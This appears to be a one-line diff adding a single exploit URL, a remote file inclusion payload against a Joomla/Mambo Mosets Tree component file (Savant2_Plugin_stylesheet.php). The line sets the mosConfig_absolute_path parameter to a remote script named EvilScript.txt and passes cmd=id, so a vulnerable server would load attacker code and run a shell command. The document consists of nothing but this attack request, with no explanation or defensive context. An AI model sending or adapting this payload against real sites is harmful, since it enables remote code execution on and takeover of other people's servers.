@@ -1,0 +1,1 @@
+http://www.example.com/[mam_jom_path]/components/com_mtree/Savant2/Savant2_Plugin_stylesheet.php?mosConfig_absolute_path=EvilScript.txt?&amp;cmd=id
